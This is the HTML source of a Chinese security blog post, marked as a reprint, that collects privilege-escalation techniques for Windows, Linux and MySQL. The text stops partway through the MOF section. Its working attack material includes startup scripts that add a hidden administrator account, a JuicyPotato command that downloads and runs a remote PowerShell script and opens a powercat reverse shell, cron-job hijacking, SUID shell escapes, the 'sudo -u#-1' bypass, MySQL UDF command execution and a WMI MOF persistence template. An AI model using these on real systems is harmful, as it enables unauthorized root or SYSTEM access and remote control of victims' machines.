@@ -1,0 +1,1787 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":true,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+  <meta name="description" content="前言 某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。 windows篇 windows溢出提权具体步骤 查看系统补丁信息 systeminfo  寻找可用exp https://github.com/SecWiki/windows-kernel-exploitshtt">
+<meta name="keywords" content="mysql,提权,udf.dll,sqlserver,linux,nullevt.mof,mof,suid">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升姿势">
+<meta property="og:url" content="https://ya2.top/articles/权限提升姿势/index.html">
+<meta property="og:site_name" content="e攻城狮">
+<meta property="og:description" content="前言 某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。 windows篇 windows溢出提权具体步骤 查看系统补丁信息 systeminfo  寻找可用exp https://github.com/SecWiki/windows-kernel-exploitshtt">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165225-c3c910d8-7bd1-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165254-d5277658-7bd1-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165334-ed296a54-7bd1-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165353-f896a92e-7bd1-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165413-0422e564-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165423-0a3f593c-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411172500-519035dc-7bd6-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165447-18ac36fc-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165501-20d27300-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165511-273211e2-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165518-2b512c4a-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165528-3127a2c0-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165550-3df2a784-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165600-445f8588-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165607-481be09a-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165614-4c79927c-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165633-57e31b9c-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165644-5eab16f0-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165651-62d8549a-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165707-6c32c566-7bd2-1.png">
+<meta property="og:image" content="https://ya2.top/articles/权限提升姿势/20200411165728-78b45ed0-7bd2-1.png">
+<meta property="og:updated_time" content="2022-07-27T16:12:58.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="权限提升姿势">
+<meta name="twitter:description" content="前言 某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。 windows篇 windows溢出提权具体步骤 查看系统补丁信息 systeminfo  寻找可用exp https://github.com/SecWiki/windows-kernel-exploitshtt">
+<meta name="twitter:image" content="https://ya2.top/articles/权限提升姿势/20200411165225-c3c910d8-7bd1-1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="e攻城狮" type="application/atom+xml">
+
+
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>权限提升姿势 | e攻城狮</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?0822ee530d1bf122367506f876cbff8d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e攻城狮</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-essay">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/随笔/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>随笔</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-瞎折腾">
+
+    
+    
+      
+    
+
+    
+
+    <a href="https://app.ya2.top/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-heart"></i> <br>瞎折腾</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ya2.top/articles/权限提升姿势/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mr.Gou">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://img.sqydt.darongshutech.com/image_201907090032257276.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e攻城狮">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">权限提升姿势
+
+              
+            
+      
+          <!-- reprint icon -->
+          
+              <span class="reprint" title="转载">转</span>
+          
+
+          </h2>
+        
+ 
+       
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-04-22 09:47:56" itemprop="dateCreated datePublished" datetime="2020-04-22T09:47:56Z">2020-04-22</time>
+            </span>
+          
+
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全研究/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 不明生物： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+     
+        
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
+<p>某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。</p>
+<h2 id="windows篇"><a href="#windows篇" class="headerlink" title="windows篇"></a>windows篇</h2><hr>
+<h3 id="windows溢出提权"><a href="#windows溢出提权" class="headerlink" title="windows溢出提权"></a>windows溢出提权</h3><h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ol>
+<li><p>查看系统补丁信息</p>
+<p>systeminfo</p>
+</li>
+<li><p>寻找可用exp</p>
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p>
+</li>
+<li><p>一把梭！</p>
+<p><img src="/articles/权限提升姿势/20200411165225-c3c910d8-7bd1-1.png" alt></p>
+</li>
+</ol>
+<h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><h4 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul>
+<li><p>启动项路径：</p>
+<p>C:\Users\{用户名}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+</li>
+<li><p>在启动项中创建vbs或bat脚本<br>vbs：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> wshshell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)  </span><br><span class="line">a=wshshell.run(<span class="string">"cmd.exe /c net user 用户名 密码 /add"</span>,<span class="number">0</span>)  </span><br><span class="line">b=wshshell.run(<span class="string">"cmd.exe /c net localgroup administrators 用户名 /add"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>bat： </p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user 用户名 密码 /add  </span><br><span class="line"><span class="built_in">net</span> localgroup administrators 用户名 /add</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。</p>
+</li>
+<li><p>bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本</p>
+</li>
+</ul>
+<h3 id="UAC提权（CVE-2019-1388）"><a href="#UAC提权（CVE-2019-1388）" class="headerlink" title="UAC提权（CVE-2019-1388）"></a>UAC提权（CVE-2019-1388）</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。<br>利用该漏洞很容易就可以提升权限到SYSTEM</p>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>按照exp作者的描述，影响范围如下：<br>Windows 2008r2 7601 <strong>link OPENED AS SYSTEM</strong><br>Windows 2012r2 9600 <strong>link OPENED AS SYSTEM</strong><br>Windows 2016 14393 <strong>link OPENED AS SYSTEM</strong><br>Windows 2019 17763 link NOT opened<br>Windows 7 SP1 7601 <strong>link OPENED AS SYSTEM</strong><br>Windows 8 9200 <strong>link OPENED AS SYSTEM</strong><br>Windows 8.1 9600 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1511 10240 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1607 14393 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1703 15063 link NOT opened<br>Windows 10 1709 16299 link NOT opened<br>…</p>
+<h4 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h4><ul>
+<li><p>EXP地址<br><a href="https://github.com/jas502n/CVE-2019-1388" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-1388</a></p>
+</li>
+<li><p>复现环境<br>windows 7专业版  </p>
+</li>
+</ul>
+<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
+<li><p>将EXP传入系统，点击下图中箭头所指的位置<br><img src="/articles/权限提升姿势/20200411165254-d5277658-7bd1-1.png" alt></p>
+</li>
+<li><p>点击颁发者中的超链接<br><img src="/articles/权限提升姿势/20200411165334-ed296a54-7bd1-1.png" alt></p>
+</li>
+<li><p>成功弹出ie，此时ie是以system权限开启<br><img src="/articles/权限提升姿势/20200411165353-f896a92e-7bd1-1.png" alt></p>
+</li>
+<li><p>页面另存为，输入cmd路径<br><img src="/articles/权限提升姿势/20200411165413-0422e564-7bd2-1.png" alt></p>
+</li>
+<li><p>权限为system<br><img src="/articles/权限提升姿势/20200411165423-0a3f593c-7bd2-1.png" alt></p>
+</li>
+</ul>
+<h3 id="Juicypotato"><a href="#Juicypotato" class="headerlink" title="Juicypotato"></a>Juicypotato</h3><h4 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h4><p>在尝试windows下的一系列提权操作后都没有成功，可以尝试一下烂土豆，这里在吐司上找到一个大佬改写的juicypotato，自动化程度比原版更高，使用起来更简单，配合webshell食用可以说是非常美味。</p>
+<h4 id="复现准备-1"><a href="#复现准备-1" class="headerlink" title="复现准备"></a>复现准备</h4><ul>
+<li><p>一个有执行权限的webshell</p>
+</li>
+<li><p>大佬改版后的<a href="https://www.t00ls.net/viewthread.php?tid=47362&highlight=potato" target="_blank" rel="noopener">Juicypotato</a></p>
+</li>
+</ul>
+<h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
+<li><p>使用webshell上传烂土豆并执行命令,这里使用powershell做反弹shell  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Juicypotato.exe -p "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://ip/ps.ps1');powercat -c ip -p 444 -e cmd"</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p>  <img src="/articles/权限提升姿势/20200411172500-519035dc-7bd6-1.png" alt></p>
+<p>  <img src="/articles/权限提升姿势/20200411165447-18ac36fc-7bd2-1.png" alt></p>
+<h2 id="linux篇"><a href="#linux篇" class="headerlink" title="linux篇"></a>linux篇</h2><hr>
+<h3 id="内核溢出"><a href="#内核溢出" class="headerlink" title="内核溢出"></a>内核溢出</h3><p>平常问大佬们linux下的提权，听的最多的就是脏牛一把梭，但是目前实战还没有提成功，固这里简单叙述一下。</p>
+<h4 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul>
+<li><p>查看内核版本</p>
+<p>uname -a</p>
+</li>
+<li><p>寻找exp一把梭  </p>
+<p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+</li>
+</ul>
+<h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><h4 id="什么是定时任务"><a href="#什么是定时任务" class="headerlink" title="什么是定时任务"></a>什么是定时任务</h4><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。</p>
+<ul>
+<li><p>通过命令查看<br>crontab -l<br>注意：只能查看当前用户的定时任务</p>
+</li>
+<li><p>可以通过以下文件查看现有定时任务<br>/etc/crontab<br>/var/spool/cron/crontabs<br>/etc/cron.*/</p>
+</li>
+</ul>
+<h4 id="提权前提"><a href="#提权前提" class="headerlink" title="提权前提"></a>提权前提</h4><ul>
+<li><p>定时任务以root或高权限用户运行</p>
+</li>
+<li><p>现有较低权限用户拥有对该定时任务文件的写权限</p>
+</li>
+</ul>
+<h4 id="复现准备-2"><a href="#复现准备-2" class="headerlink" title="复现准备"></a>复现准备</h4><ul>
+<li>以root身份创建一个定时任务，定时执行py脚本<br><img src="/articles/权限提升姿势/20200411165501-20d27300-7bd2-1.png" alt></li>
+</ul>
+<h4 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
+<li><p>假设我们获取到了一个低权限用户，查看/etc/crontab文件，发现有个以root身份运行的py脚本定时任务<br><img src="/articles/权限提升姿势/20200411165511-273211e2-7bd2-1.png" alt></p>
+</li>
+<li><p>发现可以对该文件进行读写，在py脚本中执行os命令反弹 shell<br><img src="/articles/权限提升姿势/20200411165518-2b512c4a-7bd2-1.png" alt></p>
+</li>
+<li><p>该定时任务1分钟运行一次，这里等待服务器接收shell即可<br><img src="/articles/权限提升姿势/20200411165528-3127a2c0-7bd2-1.png" alt></p>
+</li>
+</ul>
+<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><h4 id="什么是suid提权"><a href="#什么是suid提权" class="headerlink" title="什么是suid提权"></a>什么是suid提权</h4><p>详细介绍可参考<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener"> P牛大大的文章 </a>，简单来说SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p>
+<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><ul>
+<li><p>查找系统中可使用root权限运行的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null  </span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null  </span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>一些可用于提权的文件</p>
+</li>
+<li><p>Nmap(2.02-5.21)<br>nmap –interactive<br>!sh</p>
+</li>
+<li><p>find<br>touch pentestlab<br>find pentestlab -exec whoami \;</p>
+</li>
+<li><p>less/more<br>less(more) /etc/passwd<br>!/bin/sh</p>
+</li>
+<li><p>vim/vi<br>vim.tiny<br>:set shell=/bin/sh<br>:shell</p>
+</li>
+<li><p>git<br>git help config<br>!/bin/bash<br>…</p>
+<p>印象中还有一些命令可以达到提权的效果，暂时只收集了这些。这里也是提供了一个思路，找到了能以root运行的命令之后可以去翻阅这个命令的相关参数，看能否达到shell交互的效果。</p>
+</li>
+</ul>
+<h3 id="sudo权限绕过（CVE-2019-14287）"><a href="#sudo权限绕过（CVE-2019-14287）" class="headerlink" title="sudo权限绕过（CVE-2019-14287）"></a>sudo权限绕过（CVE-2019-14287）</h3><p>感觉这个漏洞实战不太会遇到，不过说不定哪天能中呢 :)</p>
+<h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令：  </p>
+<p><img src="/articles/权限提升姿势/20200411165550-3df2a784-7bd2-1.png" alt></p>
+<p>通过将用户ID修改为-1（或未签名的等价用户ID-4294967295）可以绕过该配置文件限制，达到权限提升的效果。</p>
+<h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><p>sudo &lt; 1.8.28</p>
+<h4 id="复现准备-3"><a href="#复现准备-3" class="headerlink" title="复现准备"></a>复现准备</h4><p>手动配置/etc/sudoers文件，添加内容如下：  </p>
+<p><img src="/articles/权限提升姿势/20200411165600-445f8588-7bd2-1.png" alt></p>
+<p>表示不允许用户xlxxlx以root身份执行任意命令，也就相当于无法使用sudo命令。</p>
+<h4 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
+<li><p>查看配置文件是否生效  </p>
+<p><img src="/articles/权限提升姿势/20200411165607-481be09a-7bd2-1.png" alt></p>
+<p>提示xlxxlx用户无法以root身份执行whoami</p>
+</li>
+<li><p>直接上payload<br>sudo -u#-1 whoami  </p>
+<p><img src="/articles/权限提升姿势/20200411165614-4c79927c-7bd2-1.png" alt></p>
+</li>
+</ul>
+<h2 id="Mysql篇"><a href="#Mysql篇" class="headerlink" title="Mysql篇"></a>Mysql篇</h2><hr>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h4 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h4><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
+<h4 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程"></a>提权过程</h4><p>udf.dll文件的提取可以参考<a href="https://www.jianshu.com/p/5b34c1b6dee7" target="_blank" rel="noopener">这篇文章</a></p>
+<ul>
+<li><p>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/<br>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</p>
+</li>
+<li><p>通过sql语句创建自定义命令并执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> xxx <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span>  </span><br><span class="line"><span class="keyword">select</span> xxx(<span class="string">'cmd'</span>)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>这里使用一个udf提权马进行复现</p>
+<ul>
+<li><p>自动导出udf到目录<br><img src="/articles/权限提升姿势/20200411165633-57e31b9c-7bd2-1.png" alt></p>
+</li>
+<li><p>创建自定义函数并执行提权操作<br><img src="/articles/权限提升姿势/20200411165644-5eab16f0-7bd2-1.png" alt><br><img src="/articles/权限提升姿势/20200411165651-62d8549a-7bd2-1.png" alt></p>
+</li>
+</ul>
+<h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><h4 id="什么是MOF提权"><a href="#什么是MOF提权" class="headerlink" title="什么是MOF提权"></a>什么是MOF提权</h4><p>mof提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，我们把想要执行的cmd命令代入mof文件中即可，和linux下的定时任务提权相似。</p>
+<h4 id="MOF代码"><a href="#MOF代码" class="headerlink" title="MOF代码"></a>MOF代码</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(<span class="string">"\\.\\root\\subscription"</span>)</span><br><span class="line"></span><br><span class="line">instance of  * * EventFilter as &#123;</span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">    Name = <span class="string">"filtP2"</span>;</span><br><span class="line">    Query = <span class="string">"Select * From **InstanceModificationEvent "</span></span><br><span class="line">    <span class="string">"Where TargetInstance Isa \"</span></span><br><span class="line"><span class="string">    Win32_LocalTime\" "</span></span><br><span class="line">    <span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as &#123;</span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">    ScriptText =<span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"此处填入cmd命令\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding &#123;</span><br><span class="line">    Consumer = ;</span><br><span class="line">    <span class="built_in">Filter</span> = ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>保存为 xxx.mof<br>然后mysql执行：</p>
